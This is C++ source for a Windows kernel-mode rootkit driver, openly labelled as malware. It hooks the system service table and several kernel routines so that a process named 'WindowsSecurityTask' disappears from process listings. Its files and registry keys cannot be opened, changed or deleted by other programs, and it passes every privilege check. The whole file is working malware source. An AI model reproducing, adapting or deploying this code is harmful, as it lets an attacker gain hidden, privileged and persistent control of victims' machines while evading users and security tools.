/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include <ntifs.h>
#include <ntddk.h>
#include "protection.h"
#include "KernelHook.h"

#define HIDE_FILE_NAMEW L"WindowsSecurityTask"
#define HIDE_FILE_NAME "WindowsSecurityTask"
#define HIDE_FILE_LEN 19
#define GetServiceNumber(Function)(*(PULONG)((PUCHAR)Function+1)) // Used the get the service number.

extern "C" LPSTR PsGetProcessImageFileName(PEPROCESS);

typedef NTSTATUS(*pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG); // NtQuerySystemInformation
typedef NTSTATUS(*pNtSetInformationFile)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS); // NtSetInformationFile
typedef NTSTATUS(*pNtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG); // NtCreateFile
typedef NTSTATUS(*pNtOpenFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG); // NtOpenFile
typedef NTSTATUS(*pNtDeleteFile)(POBJECT_ATTRIBUTES); // NtDeleteFile
typedef NTSTATUS(*pNtOpenKey)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES); // NtOpenKey
typedef NTSTATUS(*pNtDeleteValueKey)(HANDLE, PUNICODE_STRING); // NtDeleteValueKey
typedef NTSTATUS(*pNtSetValueKey)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG); // NtSetValueKey
typedef BOOLEAN(*pSeSinglePrivilegeCheck)(LUID, KPROCESSOR_MODE); // SeSinglePrivilegeCheck
typedef NTSTATUS(*pPsLookupProcessByProcessId)(HANDLE, PEPROCESS*); // PsLookupProcessByProcessId
typedef NTSTATUS(*pPsLookupThreadByThreadId)(HANDLE, PETHREAD*); // PsLookupThreadByThreadId

extern "C" NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);

typedef struct _KSERVICE_DESCRIPTOR_TABLE
{
	PULONG ServiceTableBase;
	PULONG ServiceCounterTableBase;
	ULONG NumberOfServices;
	PUCHAR ParamTableBase;
}KSERVICE_DESCRIPTOR_TABLE, * PKSERVICE_DESCRIPTOR_TABLE;

typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

extern "C" PKSERVICE_DESCRIPTOR_TABLE KeServiceDescriptorTable;

pNtQuerySystemInformation origNtQuerySystemInformation;
pNtSetInformationFile origNtSetInformationFile;
pNtCreateFile origNtCreateFile;
pNtDeleteFile origNtDeleteFile;
pNtOpenFile origNtOpenFile;
pNtOpenKey origNtOpenKey;
pNtDeleteValueKey origNtDeleteValueKey;
pNtSetValueKey origNtSetValueKey;
pSeSinglePrivilegeCheck origSeSinglePrivilegeCheck;
pPsLookupProcessByProcessId origPsLookupProcessByProcessId;
pPsLookupThreadByThreadId origPsLookupThreadByThreadId;

KERNEL_HOOK KernelHooK_SeSinglePrivilegeCheck, KernelHook_PsLookupProcessByProcessId, KernelHook_PsLookupThreadByThreadId;

PVOID Hook(ULONG ServiceNumber, PVOID Hook)
{
	PVOID OrigAddress;

	OrigAddress = (PVOID)KeServiceDescriptorTable->ServiceTableBase[ServiceNumber]; // Save original function address to variable

	deprotect();

	KeServiceDescriptorTable->ServiceTableBase[ServiceNumber] = (ULONG)Hook; // change the orignal function address in memory to the Hook function

	protect();

	return OrigAddress;
}

BOOLEAN IsRootProcess()
{
	if (strstr(PsGetProcessImageFileName(PsGetCurrentProcess()), HIDE_FILE_NAME))
	{
		return TRUE;
	}

	return FALSE;
}

BOOLEAN IsCsrssProcess()
{
	if (!strcmp(PsGetProcessImageFileName(PsGetCurrentProcess()), "csrss.exe"))
	{
		return TRUE;
	}

	return FALSE;
}

NTSTATUS HookPsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS* eProcess)
{
	NTSTATUS NtStatus;
	NtStatus = origPsLookupProcessByProcessId(ProcessId, eProcess); // Call the original function

	if (IsRootProcess())
		return NtStatus;

	if (IsCsrssProcess())
		return NtStatus;

	if (NT_SUCCESS(NtStatus))
	{
		if (strstr(PsGetProcessImageFileName(*eProcess), HIDE_FILE_NAME)) // Get the process name
		{
			// If this is root process, deny the access
			ObDereferenceObject(*eProcess); // Dereference the thread object

			*eProcess = NULL; // Set the object pointer to NULL
			return STATUS_ACCESS_DENIED; // Return error to caller
		}
	}

	return NtStatus;
}

NTSTATUS HookPsLookupThreadByThreadId(HANDLE ThreadId, PETHREAD* eThread)
{
	NTSTATUS NtStatus;

	NtStatus = origPsLookupThreadByThreadId(ThreadId, eThread); // Call the original function

	if (IsRootProcess())
		return NtStatus;

	if (IsCsrssProcess())
		return NtStatus;

	if (NT_SUCCESS(NtStatus))
	{
		if (strstr(PsGetProcessImageFileName(PsGetThreadProcess(*eThread)), HIDE_FILE_NAME)) // Get the owner process name
		{
			// If the thread is belongs to the root process, deny the access.

			ObDereferenceObject(*eThread); // Dereference the thread object

			*eThread = NULL; // Set the object pointer to NULL
			return STATUS_ACCESS_DENIED; // Return error to caller
		}
	}

	return NtStatus;
}

NTSTATUS HookNtOpenKey(
	PHANDLE KeyHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
)
{
	KdPrint(("HookNtOpenKey Called!\n"));

	NTSTATUS NtStatus;
	ANSI_STRING ansiFileName;

	NtStatus = origNtOpenKey(KeyHandle, DesiredAccess, ObjectAttributes);

	if (IsRootProcess())
		return NtStatus;

	if (NT_SUCCESS(NtStatus))
	{
		if (NT_SUCCESS(RtlUnicodeStringToAnsiString(&ansiFileName, ObjectAttributes->ObjectName, TRUE))) // Get the file name
		{
			if (strstr(ansiFileName.Buffer, HIDE_FILE_NAME)) // Check the file name
			{
				KdPrint(("HookNtOpenKey Done!"));
				return STATUS_ACCESS_DENIED; // If this is protected file, deny the access.
			}
		}
	}
	return NtStatus;
}

BOOLEAN HookSeSinglePrivilegeCheck(LUID PrivilegeValue, KPROCESSOR_MODE PreviousMode)
{
	// SeSinglePrivilegeCheck returns TRUE if the current subject has the required privilege.

	if (IsRootProcess())
		return TRUE; // This allows the root process to bypass privilege checks

	return origSeSinglePrivilegeCheck(PrivilegeValue, PreviousMode);
}

NTSTATUS HookNtSetValueKey(
	HANDLE KeyHandle,
	PUNICODE_STRING ValueName,
	ULONG TitleIndex,
	ULONG Type,
	PVOID Data,
	ULONG DataSize
)
{
	KdPrint(("HookNtSetValueKey Called!\n"));

	NTSTATUS NtStatus;

	NtStatus = origNtSetValueKey(KeyHandle, ValueName, TitleIndex, Type, Data, DataSize); // Call the original function

	if (IsRootProcess())
		return NtStatus;

	if (NT_SUCCESS(NtStatus))
	{
		char buffer[1024];
		ULONG ReturnLength;
		PKEY_NAME_INFORMATION KeyNameInfo;

		KeyNameInfo = (PKEY_NAME_INFORMATION)&buffer;

		if (NT_SUCCESS(ZwQueryKey(KeyHandle, KeyNameInformation, KeyNameInfo, 1024, &ReturnLength))) // Get the key name
		{
			if (wcsstr(KeyNameInfo->Name, HIDE_FILE_NAMEW))
			{
				return STATUS_ACCESS_DENIED;
			}
		}
	}

	return NtStatus;
}

NTSTATUS HookNtDeleteValueKey(
	HANDLE KeyHandle, 
	PUNICODE_STRING ValueName
)
{
	NTSTATUS NtStatus;
	NtStatus = origNtDeleteValueKey(KeyHandle, ValueName); // Call the original function

	if (IsRootProcess())
		return NtStatus;

	if (NT_SUCCESS(NtStatus))
	{
		char buffer[1024];
		ULONG ReturnLength;
		PKEY_NAME_INFORMATION KeyNameInfo;

		KeyNameInfo = (PKEY_NAME_INFORMATION)&buffer;

		if (NT_SUCCESS(ZwQueryKey(KeyHandle, KeyNameInformation, KeyNameInfo, 1024, &ReturnLength))) // Get the key name
		{
			if (wcsstr(KeyNameInfo->Name, HIDE_FILE_NAMEW))
			{
				return STATUS_ACCESS_DENIED;
			}
		}

		if (wcsstr(ValueName->Buffer, HIDE_FILE_NAMEW))
		{
			return STATUS_ACCESS_DENIED;
		}
	}

	return NtStatus;
}

NTSTATUS HookNtCreateFile(
	PHANDLE FileHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK IoStatusBlock,
	PLARGE_INTEGER AllocationSize,
	ULONG FileAttributes,
	ULONG ShareAccess,
	ULONG CreateDisposition,
	ULONG CreateOptions,
	PVOID EaBuffer,
	ULONG EaLength
)
{
	KdPrint(("NtCreateFile Called!\n"));
	NTSTATUS NtStatus;
	ANSI_STRING ansiFileName;

	NtStatus = origNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength); // Call the original function

	if (IsRootProcess())
		return NtStatus;

	if (NT_SUCCESS(NtStatus))
	{
		if (NT_SUCCESS(RtlUnicodeStringToAnsiString(&ansiFileName, ObjectAttributes->ObjectName, TRUE))) // Get the file name
		{
			if (DesiredAccess & GENERIC_WRITE || DesiredAccess & GENERIC_READ)
			{
				if (strstr(ansiFileName.Buffer, HIDE_FILE_NAME)) // Check the file name
				{
					KdPrint(("NtCreateFile Done!"));
					return STATUS_ACCESS_DENIED; // If this is protected file, deny the access.
				}
			}
		}
	}

	return NtStatus;
}

NTSTATUS HookNtOpenFile(
	PHANDLE FileHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK IoStatusBlock,
	ULONG ShareAccess,
	ULONG OpenOptions
)
{
	KdPrint(("NtOpenFile Called\n"));

	NTSTATUS NtStatus;
	ANSI_STRING ansiFileName;

	NtStatus = origNtOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions); // Call the original function

	if (NT_SUCCESS(NtStatus))
	{
		if (NT_SUCCESS(RtlUnicodeStringToAnsiString(&ansiFileName, ObjectAttributes->ObjectName, TRUE))) // Get the file name
		{
			if (DesiredAccess & GENERIC_WRITE || DesiredAccess & GENERIC_READ)
			{
				if (strstr(ansiFileName.Buffer, HIDE_FILE_NAME)) // Check the file name
				{
					KdPrint(("NtOpenFile Done!"));
					return STATUS_ACCESS_DENIED; // If this is protected file, deny the access.
				}
			}
		}
	}

	return NtStatus;
}

NTSTATUS HookNtDeleteFile(POBJECT_ATTRIBUTES ObjectAttributes)
{
	NTSTATUS NtStatus;
	ANSI_STRING ansiFileName;
	NtStatus = origNtDeleteFile(ObjectAttributes);

	KdPrint(("HookNtDeleteFile Called!"));

	if (IsRootProcess())
		return NtStatus;

	if (NT_SUCCESS(NtStatus))
	{
		if (NT_SUCCESS(RtlUnicodeStringToAnsiString(&ansiFileName, ObjectAttributes->ObjectName, TRUE))) // Get the file name
		{
			if (strstr(ansiFileName.Buffer, HIDE_FILE_NAME)) // Check the file name
			{
				KdPrint(("HookNtDeleteFile Done!"));
				return STATUS_ACCESS_DENIED; // If this is protected file, deny the access.
			}
		}
	}

	return NtStatus;
}

NTSTATUS HookNtQuerySystemInformation(
	ULONG InfoClass, 
	PVOID Buffer, 
	ULONG Length, 
	PULONG ReturnLength
) // Hide Process
{
	PSYSTEM_PROCESS_INFO pCurr, pNext;
	NTSTATUS ret;

	if (InfoClass != 5)
		return origNtQuerySystemInformation(InfoClass, Buffer, Length, ReturnLength);

	ret = origNtQuerySystemInformation(InfoClass, Buffer, Length, ReturnLength);

	if (IsRootProcess())
		return ret;

	if (NT_SUCCESS(ret))
	{
		pCurr = NULL;
		pNext = (PSYSTEM_PROCESS_INFO)Buffer;

		while (pNext->NextEntryOffset != 0)
		{
			pCurr = pNext;
			pNext = (PSYSTEM_PROCESS_INFO)((PUCHAR)pCurr + pCurr->NextEntryOffset);

			if (wcsstr(pNext->ImageName.Buffer, HIDE_FILE_NAMEW))
			{
				if (pNext->NextEntryOffset == 0)
				{
					pCurr->NextEntryOffset = 0;
				}

				else
				{
					pCurr->NextEntryOffset += pNext->NextEntryOffset;
				}

				pNext = pCurr;
			}
		}
	}

	return ret;
}

// File protection via NtSetInformationFile hook.

NTSTATUS HookNtSetInformationFile(
	HANDLE hFile,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID FileInfo, 
	ULONG Length, 
	FILE_INFORMATION_CLASS InfoClass
)
{
	char buffer[1024];
	IO_STATUS_BLOCK ibs;

	PFILE_NAME_INFORMATION FileNameInfo;

	FileNameInfo = (PFILE_NAME_INFORMATION)&buffer;

	if (IsRootProcess())
		return origNtSetInformationFile(hFile, IoStatusBlock, FileInfo, Length, InfoClass);

	// FileDispositionInformation : Request to delete the file when it is closed or cancel a previously requested deletion.
	// The choice whether to delete or cancel is supplied in a FILE_DISPOSITION_INFORMATION structure.

	if (InfoClass == FileDispositionInformation || InfoClass == FileRenameInformation) // Block Delete\Rename file תסתכל אם יש משהו על כתיבה וקריאה!!!!!!!!!!
	{
		// The ZwQueryInformationFile routine returns various kinds of information about a file object.
		if (NT_SUCCESS(ZwQueryInformationFile(hFile, &ibs, FileNameInfo, 1024, FileNameInformation))) // Get the file name
		{
			if (wcsstr(FileNameInfo->FileName, HIDE_FILE_NAMEW)) // Check the file name
			{
				return STATUS_ACCESS_DENIED; // If this is protected file, deny the access.
			}
		}
	}

	return origNtSetInformationFile(hFile, IoStatusBlock, FileInfo, Length, InfoClass); // Call the original function
}
// END - File protection via NtSetInformationFile hook.

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	UNREFERENCED_PARAMETER(pDriverObject);
	UNREFERENCED_PARAMETER(pRegistryPath);
	KdPrint(("Load Driver Success!"));

	// Set inline hooks

	KhInitHook(&KernelHooK_SeSinglePrivilegeCheck, SeSinglePrivilegeCheck, HookSeSinglePrivilegeCheck); 
	KhInitHook(&KernelHook_PsLookupProcessByProcessId, PsLookupProcessByProcessId, HookPsLookupProcessByProcessId);
	KhInitHook(&KernelHook_PsLookupThreadByThreadId, PsLookupThreadByThreadId, HookPsLookupThreadByThreadId);

	origSeSinglePrivilegeCheck = (pSeSinglePrivilegeCheck)KernelHooK_SeSinglePrivilegeCheck.OrigFunction;
	origPsLookupProcessByProcessId = (pPsLookupProcessByProcessId)KernelHook_PsLookupProcessByProcessId.OrigFunction;
	origPsLookupThreadByThreadId = (pPsLookupThreadByThreadId)KernelHook_PsLookupThreadByThreadId.OrigFunction;

	KhStartHook(&KernelHooK_SeSinglePrivilegeCheck);
	KhStartHook(&KernelHook_PsLookupProcessByProcessId);
	KhStartHook(&KernelHook_PsLookupThreadByThreadId);

	// Set SSDT hooks

	origNtQuerySystemInformation = (pNtQuerySystemInformation)Hook(GetServiceNumber(ZwQuerySystemInformation), HookNtQuerySystemInformation);
	origNtSetInformationFile = (pNtSetInformationFile)Hook(GetServiceNumber(ZwSetInformationFile), HookNtSetInformationFile);

	origNtCreateFile = (pNtCreateFile)Hook(GetServiceNumber(ZwCreateFile), HookNtCreateFile);
	origNtOpenFile = (pNtOpenFile)Hook(GetServiceNumber(ZwOpenFile), HookNtOpenFile);
	origNtDeleteFile = (pNtDeleteFile)Hook(GetServiceNumber(ZwDeleteFile), HookNtDeleteFile);

	origNtOpenKey = (pNtOpenKey)Hook(GetServiceNumber(ZwOpenKey), HookNtOpenKey);
	origNtDeleteValueKey = (pNtDeleteValueKey)Hook(GetServiceNumber(ZwDeleteValueKey), HookNtDeleteValueKey);
	origNtSetValueKey = (pNtSetValueKey)Hook(GetServiceNumber(ZwSetValueKey), HookNtSetValueKey);

	return STATUS_SUCCESS;
}